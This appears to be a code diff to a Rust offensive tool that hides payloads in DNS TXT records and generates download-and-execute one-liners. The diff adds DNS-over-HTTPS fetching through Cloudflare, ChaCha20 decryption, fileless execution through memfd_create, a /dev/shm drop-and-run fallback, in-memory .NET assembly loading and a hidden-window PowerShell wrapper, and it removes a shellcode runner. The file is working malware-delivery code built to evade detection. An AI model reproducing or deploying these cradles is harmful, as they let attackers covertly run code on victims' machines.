@@ -17,8 +17,8 @@ pub enum CradleError {
     MetaNotFound(String),
     #[error("metadata parse error: {0}")]
     MetaParse(String),
-    #[error("crypto error: {0}")]
-    Crypto(String),
+    #[error("encryption error: {0}")]
+    EncryptionError(String),
     #[error("{0}")]
     Other(String),
 }
@@ -26,21 +26,14 @@ pub enum CradleError {
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
 #[serde(rename_all = "lowercase")]
 pub enum PayloadType {
-    Script,
-    Elf,
-    Pe,
-    Shellcode,
+    Script, Elf, Pe,
 }
 
 impl PayloadType {
     pub fn detect(data: &[u8]) -> Self {
-        if data.len() >= 4 && &data[..4] == b"\x7fELF" {
-            PayloadType::Elf
-        } else if data.len() >= 2 && &data[..2] == b"MZ" {
-            PayloadType::Pe
-        } else {
-            PayloadType::Script
-        }
+        if data.len() >= 4 && &data[..4] == b"\x7fELF" { PayloadType::Elf }
+        else if data.len() >= 2 && &data[..2] == b"MZ" { PayloadType::Pe }
+        else { PayloadType::Script }
     }
 }
 
@@ -50,7 +43,6 @@ impl std::fmt::Display for PayloadType {
             PayloadType::Script => write!(f, "script"),
             PayloadType::Elf => write!(f, "elf"),
             PayloadType::Pe => write!(f, "pe"),
-            PayloadType::Shellcode => write!(f, "shellcode"),
         }
     }
 }
@@ -62,7 +54,6 @@ impl std::str::FromStr for PayloadType {
             "script" => Ok(PayloadType::Script),
             "elf" => Ok(PayloadType::Elf),
             "pe" => Ok(PayloadType::Pe),
-            "shellcode" | "sc" => Ok(PayloadType::Shellcode),
             _ => Err(format!("unknown payload type: {s}")),
         }
     }
@@ -75,25 +66,17 @@ pub struct StageMeta {
     #[serde(rename = "type")]
     pub payload_type: PayloadType,
     pub hash: String,
-    /// Whether the staged payload is encrypted (ChaCha20-Poly1305)
+    /// Whether the staged data is encrypted (ChaCha20-Poly1305)
     #[serde(default)]
     pub encrypted: bool,
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
-pub enum Shell {
-    Bash,
-    Pwsh,
-    Cmd,
-}
+pub enum Shell { Bash, Pwsh, Cmd }
 
 impl std::fmt::Display for Shell {
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-        match self {
-            Shell::Bash => write!(f, "bash"),
-            Shell::Pwsh => write!(f, "pwsh"),
-            Shell::Cmd => write!(f, "cmd"),
-        }
+        match self { Shell::Bash => write!(f, "bash"), Shell::Pwsh => write!(f, "pwsh"), Shell::Cmd => write!(f, "cmd") }
     }
 }
 
@@ -109,6 +92,34 @@ impl std::str::FromStr for Shell {
     }
 }
 
+/// Cradle transport method
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum CradleTransport {
+    /// Use dig (default, requires dig on target)
+    Dig,
+    /// Use DNS-over-HTTPS via curl (no dig required, encrypted DNS)
+    DoH,
+}
+
+impl std::str::FromStr for CradleTransport {
+    type Err = String;
+    fn from_str(s: &str) -> Result<Self, Self::Err> {
+        match s.to_lowercase().as_str() {
+            "dig" | "dns" => Ok(CradleTransport::Dig),
+            "doh" | "https" | "curl" => Ok(CradleTransport::DoH),
+            _ => Err(format!("unknown transport: {s} (try: dig, doh)")),
+        }
+    }
+}
+
+/// Validate a DNS label/domain component for safe use in shell commands.
+/// Allows only alphanumeric, hyphens, dots, and underscores.
+fn sanitize_dns_name(name: &str) -> String {
+    name.chars()
+        .filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '.' || *c == '_')
+        .collect()
+}
+
 fn meta_record_name(label: &str, domain: &str) -> String {
     format!("_s.meta.{label}.{domain}")
 }
@@ -121,40 +132,35 @@ fn record_prefix(label: &str, domain: &str) -> String {
     format!("_s.{label}.{domain}")
 }
 
-/// Stage a payload into DNS TXT records.
-///
-/// By default, records are plain base64 (for native-tool cradle compatibility).
-/// If `encrypt` is true, the payload is encrypted with ChaCha20-Poly1305 before
-/// base64 encoding — cradles will need the key to decode.
+/// Stage a payload into DNS TXT records, optionally encrypting it first
 pub async fn stage_payload(
-    backend: &dyn DnsBackend,
-    domain: &str,
-    label: &str,
-    data: &[u8],
+    backend: &dyn DnsBackend, domain: &str, label: &str, data: &[u8],
     payload_type: Option<PayloadType>,
-    encrypt: bool,
-    encryption_key: Option<&crate::crypto::EncryptionKey>,
 ) -> Result<StageMeta, CradleError> {
-    if data.is_empty() {
-        return Err(CradleError::EmptyPayload(0));
-    }
+    stage_payload_encrypted(backend, domain, label, data, payload_type, None).await
+}
+
+/// Stage a payload with optional ChaCha20-Poly1305 encryption
+pub async fn stage_payload_encrypted(
+    backend: &dyn DnsBackend, domain: &str, label: &str, data: &[u8],
+    payload_type: Option<PayloadType>,
+    key: Option<&crate::crypto::EncryptionKey>,
+) -> Result<StageMeta, CradleError> {
+    if data.is_empty() { return Err(CradleError::EmptyPayload(0)); }
 
     let ptype = payload_type.unwrap_or_else(|| PayloadType::detect(data));
     let hash = blake3::hash(data).to_hex()[..32].to_string();
 
-    // Optionally encrypt the payload
-    let staged_data = if encrypt {
-        let key = encryption_key.ok_or_else(|| {
-            CradleError::Crypto("encryption requested but no key provided".to_string())
-        })?;
-        crate::crypto::encrypt(key, data)
-            .map_err(|e| CradleError::Crypto(e.to_string()))?
+    // Optionally encrypt the payload before chunking
+    let (staged_data, encrypted) = if let Some(k) = key {
+        let encrypted_data = crate::crypto::encrypt(k, data)
+            .map_err(|e| CradleError::EncryptionError(format!("{e}")))?;
+        (encrypted_data, true)
     } else {
-        data.to_vec()
+        (data.to_vec(), false)
     };
 
-    let chunks: Vec<String> = staged_data
-        .chunks(MAX_CHUNK_RAW)
+    let chunks: Vec<String> = staged_data.chunks(MAX_CHUNK_RAW)
         .map(|chunk| base64::engine::general_purpose::STANDARD.encode(chunk))
         .collect();
 
@@ -163,48 +169,37 @@ pub async fn stage_payload(
         size: data.len(),
         payload_type: ptype,
         hash,
-        encrypted: encrypt,
+        encrypted,
     };
 
     let meta_name = meta_record_name(label, domain);
-    let meta_json =
-        serde_json::to_string(&meta).map_err(|e| CradleError::Other(e.to_string()))?;
-    backend
-        .create_record(&meta_name, &meta_json, RECORD_TTL)
-        .await?;
+    let meta_json = serde_json::to_string(&meta).map_err(|e| CradleError::Other(e.to_string()))?;
+    backend.create_record(&meta_name, &meta_json, RECORD_TTL).await?;
 
     let mut batch: Vec<(String, String)> = Vec::with_capacity(chunks.len());
     for (i, encoded) in chunks.iter().enumerate() {
         batch.push((chunk_record_name(i, label, domain), encoded.clone()));
     }
-    let batch_refs: Vec<(&str, &str, u32)> = batch
-        .iter()
-        .map(|(name, content)| (name.as_str(), content.as_str(), RECORD_TTL))
-        .collect();
+    let batch_refs: Vec<(&str, &str, u32)> = batch.iter()
+        .map(|(name, content)| (name.as_str(), content.as_str(), RECORD_TTL)).collect();
     backend.batch_create(batch_refs).await?;
 
     Ok(meta)
 }
 
 pub async fn read_stage_meta(
-    backend: &dyn DnsBackend,
-    domain: &str,
-    label: &str,
+    backend: &dyn DnsBackend, domain: &str, label: &str,
 ) -> Result<StageMeta, CradleError> {
     let name = meta_record_name(label, domain);
     let records = backend.get_records(&name).await?;
-    let record = records
-        .first()
-        .ok_or_else(|| CradleError::MetaNotFound(label.to_string()))?;
+    let record = records.first().ok_or_else(|| CradleError::MetaNotFound(label.to_string()))?;
     let meta: StageMeta = serde_json::from_str(&record.content)
         .map_err(|e| CradleError::MetaParse(e.to_string()))?;
     Ok(meta)
 }
 
 pub async fn unstage_payload(
-    backend: &dyn DnsBackend,
-    domain: &str,
-    label: &str,
+    backend: &dyn DnsBackend, domain: &str, label: &str,
 ) -> Result<usize, CradleError> {
     let prefix = record_prefix(label, domain);
     let meta_name = meta_record_name(label, domain);
@@ -212,100 +207,165 @@ pub async fn unstage_payload(
 
     let meta_records = backend.get_records(&meta_name).await?;
     for r in &meta_records {
-        if let Some(id) = &r.id {
-            backend.delete_record(id).await?;
-            deleted += 1;
-        }
+        if let Some(id) = &r.id { backend.delete_record(id).await?; deleted += 1; }
     }
 
     let all_records = backend.list_records(&prefix).await?;
     for r in &all_records {
-        if let Some(id) = &r.id {
-            backend.delete_record(id).await?;
-            deleted += 1;
-        }
+        if let Some(id) = &r.id { backend.delete_record(id).await?; deleted += 1; }
     }
 
     Ok(deleted)
 }
 
+/// Generate a cradle one-liner for the given shell and transport
 pub fn generate_cradle(
-    shell: Shell,
-    domain: &str,
-    label: &str,
-    meta: &StageMeta,
-    ns_server: Option<&str>,
+    shell: Shell, domain: &str, label: &str, meta: &StageMeta, ns_server: Option<&str>,
 ) -> String {
+    generate_cradle_ext(shell, domain, label, meta, ns_server, CradleTransport::Dig, None)
+}
+
+/// Extended cradle generation with transport selection and optional decryption key
+pub fn generate_cradle_ext(
+    shell: Shell, domain: &str, label: &str, meta: &StageMeta,
+    ns_server: Option<&str>, transport: CradleTransport, key_hex: Option<&str>,
+) -> String {
+    if meta.chunks == 0 {
+        return "# Error: staged payload has 0 chunks".to_string();
+    }
     let n = meta.chunks - 1;
-    let is_binary = matches!(
-        meta.payload_type,
-        PayloadType::Elf | PayloadType::Pe | PayloadType::Shellcode
-    );
-    match shell {
-        Shell::Bash => gen_bash(domain, label, n, is_binary, ns_server),
-        Shell::Pwsh => gen_pwsh(domain, label, n, is_binary, meta.payload_type, ns_server),
-        Shell::Cmd => gen_cmd(domain, label, n, is_binary, meta.payload_type, ns_server),
+    let is_binary = matches!(meta.payload_type, PayloadType::Elf | PayloadType::Pe);
+    // Sanitize domain/label to prevent shell injection in generated one-liners
+    let safe_domain = sanitize_dns_name(domain);
+    let safe_label = sanitize_dns_name(label);
+    match (shell, transport) {
+        (Shell::Bash, CradleTransport::Dig) => gen_bash(&safe_domain, &safe_label, n, is_binary, ns_server, key_hex),
+        (Shell::Bash, CradleTransport::DoH) => gen_bash_doh(&safe_domain, &safe_label, n, is_binary, key_hex),
+        (Shell::Pwsh, _) => gen_pwsh(&safe_domain, &safe_label, n, is_binary, meta.payload_type, ns_server),
+        (Shell::Cmd, _) => gen_cmd(&safe_domain, &safe_label, n, is_binary, meta.payload_type, ns_server),
     }
 }
 
-fn gen_bash(
-    domain: &str,
-    label: &str,
-    max_idx: usize,
-    is_binary: bool,
-    ns: Option<&str>,
-) -> String {
+fn gen_bash(domain: &str, label: &str, max_idx: usize, is_binary: bool, ns: Option<&str>, key_hex: Option<&str>) -> String {
     let ns = ns.map(|s| format!(" @{s}")).unwrap_or_default();
-    let fetch = format!(
-        "for i in $(seq 0 {max_idx});do dig +short TXT _s.$i.{label}.{domain}{ns}|tr -d '\"';done"
-    );
+    let fetch = format!("for i in $(seq 0 {max_idx});do dig +short TXT _s.$i.{label}.{domain}{ns}|tr -d '\"';done");
+
+    let decrypt_step = if let Some(k) = key_hex {
+        // Decrypt with openssl: nonce=first 12 bytes, data=rest
+        format!(
+            "|base64 -d|python3 -c \"import sys;d=sys.stdin.buffer.read();n=d[:12];c=d[12:];\
+             from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305;\
+             print(ChaCha20Poly1305(bytes.fromhex('{k}')).decrypt(n,c,None).decode(),end='')\""
+        )
+    } else {
+        String::new()
+    };
 
     if is_binary {
-        let memfd = format!(
-            "python3 -c \"import ctypes,base64,os;b=base64.b64decode('$({fetch})');\
-             fd=ctypes.CDLL(None).memfd_create(b'x',1);os.write(fd,b);\
-             os.execve(f'/proc/self/fd/{{fd}}',['.'],dict(os.environ))\""
-        );
-        let shm = format!(
-            "{fetch}|base64 -d>/dev/shm/.x&&chmod +x /dev/shm/.x&&/dev/shm/.x;rm -f /dev/shm/.x"
-        );
-        format!("# Fileless (python3):\n{memfd}\n\n# /dev/shm fallback:\n{shm}")
+        if key_hex.is_some() {
+            // Encrypted binary: decrypt then memfd exec
+            let memfd = format!(
+                "python3 -c \"import ctypes,os,sys;from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305;\
+                 import base64;d=base64.b64decode('$({fetch})');n=d[:12];c=d[12:];\
+                 b=ChaCha20Poly1305(bytes.fromhex('{k}')).decrypt(n,c,None);\
+                 fd=ctypes.CDLL(None).memfd_create(b'x',1);os.write(fd,b);\
+                 os.execve(f'/proc/self/fd/{{fd}}',['.'],dict(os.environ))\"",
+                fetch = fetch,
+                k = key_hex.unwrap(),
+            );
+            format!("# Encrypted fileless:\n{memfd}")
+        } else {
+            let memfd = format!(
+                "python3 -c \"import ctypes,base64,os;b=base64.b64decode('$({fetch})');\
+                 fd=ctypes.CDLL(None).memfd_create(b'x',1);os.write(fd,b);\
+                 os.execve(f'/proc/self/fd/{{fd}}',['.'],dict(os.environ))\""
+            );
+            let shm = format!("{fetch}|base64 -d>/dev/shm/.x&&chmod +x /dev/shm/.x&&/dev/shm/.x;rm -f /dev/shm/.x");
+            format!("# Fileless (python3):\n{memfd}\n\n# /dev/shm fallback:\n{shm}")
+        }
     } else {
-        format!("eval \"$({fetch}|base64 -d)\"")
+        if decrypt_step.is_empty() {
+            format!("eval \"$({fetch}|base64 -d)\"")
+        } else {
+            format!("eval \"$({fetch}{decrypt_step})\"")
+        }
     }
 }
 
-fn gen_pwsh(
-    domain: &str,
-    label: &str,
-    max_idx: usize,
-    is_binary: bool,
-    ptype: PayloadType,
-    ns: Option<&str>,
-) -> String {
-    let ns_p = ns.map(|s| format!(" -Se {s}")).unwrap_or_default();
+/// Generate a bash cradle that uses DNS-over-HTTPS via curl (no dig required)
+fn gen_bash_doh(domain: &str, label: &str, max_idx: usize, is_binary: bool, key_hex: Option<&str>) -> String {
+    // DoH via curl to Cloudflare's JSON API (simpler than wire format for shell)
     let fetch = format!(
-        "-join(0..{max_idx}|%{{(Resolve-DnsName -Ty TXT -Na \"_s.$_.{label}.{domain}\"{ns_p}).Strings}})"
+        "for i in $(seq 0 {max_idx});do \
+         curl -sH 'accept: application/dns-json' \
+         'https://cloudflare-dns.com/dns-query?name=_s.'$i'.{label}.{domain}&type=TXT' \
+         |python3 -c \"import sys,json;d=json.load(sys.stdin);print(d.get('Answer',[{{}}])[0].get('data','').strip('\\\"'),end='')\"; \
+         done"
     );
+
+    let decrypt_step = if let Some(k) = key_hex {
+        format!(
+            "|base64 -d|python3 -c \"import sys;d=sys.stdin.buffer.read();n=d[:12];c=d[12:];\
+             from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305;\
+             print(ChaCha20Poly1305(bytes.fromhex('{k}')).decrypt(n,c,None).decode(),end='')\""
+        )
+    } else {
+        String::new()
+    };
+
+    if is_binary {
+        if let Some(k) = key_hex {
+            format!(
+                "# DoH encrypted fileless:\n\
+                 python3 -c \"import ctypes,os,json,urllib.request as u,base64;\
+                 from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305;\
+                 b64='';\n\
+                 for i in range({n}):\n\
+                  r=json.load(u.urlopen(u.Request(\
+                  'https://cloudflare-dns.com/dns-query?name=_s.'+str(i)+'.{label}.{domain}&type=TXT',\
+                  headers={{'accept':'application/dns-json'}})));\
+                  b64+=r.get('Answer',[{{}}])[0].get('data','').strip('\\\"')\n\
+                 d=base64.b64decode(b64);b=ChaCha20Poly1305(bytes.fromhex('{k}')).decrypt(d[:12],d[12:],None);\
+                 fd=ctypes.CDLL(None).memfd_create(b'x',1);os.write(fd,b);\
+                 os.execve(f'/proc/self/fd/{{fd}}',['.'],dict(os.environ))\"",
+                n = max_idx + 1,
+            )
+        } else {
+            format!(
+                "# DoH fileless:\n\
+                 python3 -c \"import ctypes,os,json,urllib.request as u,base64;\
+                 b64='';\n\
+                 for i in range({n}):\n\
+                  r=json.load(u.urlopen(u.Request(\
+                  'https://cloudflare-dns.com/dns-query?name=_s.'+str(i)+'.{label}.{domain}&type=TXT',\
+                  headers={{'accept':'application/dns-json'}})));\
+                  b64+=r.get('Answer',[{{}}])[0].get('data','').strip('\\\"')\n\
+                 b=base64.b64decode(b64);\
+                 fd=ctypes.CDLL(None).memfd_create(b'x',1);os.write(fd,b);\
+                 os.execve(f'/proc/self/fd/{{fd}}',['.'],dict(os.environ))\"",
+                n = max_idx + 1,
+            )
+        }
+    } else {
+        if decrypt_step.is_empty() {
+            format!("eval \"$({fetch}|base64 -d)\"")
+        } else {
+            format!("eval \"$({fetch}{decrypt_step})\"")
+        }
+    }
+}
+
+fn gen_pwsh(domain: &str, label: &str, max_idx: usize, is_binary: bool, ptype: PayloadType, ns: Option<&str>) -> String {
+    let ns_p = ns.map(|s| format!(" -Se {s}")).unwrap_or_default();
+    let fetch = format!("-join(0..{max_idx}|%{{(Resolve-DnsName -Ty TXT -Na \"_s.$_.{label}.{domain}\"{ns_p}).Strings}})");
 
     if is_binary {
         match ptype {
             PayloadType::Pe => format!(
-                "$b=[Convert]::FromBase64String({fetch});\
-                 [Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@(,@()))"
-            ),
-            PayloadType::Shellcode => format!(
-                "$b=[Convert]::FromBase64String({fetch});\
-                 $m=[Runtime.InteropServices.Marshal];\
-                 $p=$m::AllocHGlobal($b.Length);\
-                 $m::Copy($b,0,$p,$b.Length);\
-                 $d=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p,[Action]);\
-                 $d.Invoke()"
+                "$b=[Convert]::FromBase64String({fetch});[Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@(,@()))"
             ),
             _ => format!(
-                "$b=[Convert]::FromBase64String({fetch});\
-                 $f='/dev/shm/.x';[IO.File]::WriteAllBytes($f,$b);\
-                 chmod +x $f;Start-Process $f -Wait;rm $f"
+                "$b=[Convert]::FromBase64String({fetch});$f='/dev/shm/.x';[IO.File]::WriteAllBytes($f,$b);chmod +x $f;Start-Process $f -Wait;rm $f"
             ),
         }
     } else {
@@ -313,14 +373,7 @@ fn gen_pwsh(
     }
 }
 
-fn gen_cmd(
-    domain: &str,
-    label: &str,
-    max_idx: usize,
-    is_binary: bool,
-    ptype: PayloadType,
-    ns: Option<&str>,
-) -> String {
+fn gen_cmd(domain: &str, label: &str, max_idx: usize, is_binary: bool, ptype: PayloadType, ns: Option<&str>) -> String {
     let inner = gen_pwsh(domain, label, max_idx, is_binary, ptype, ns);
     let escaped = inner.replace('"', "\\\"");
     format!("powershell -nop -w hidden -c \"{escaped}\"")
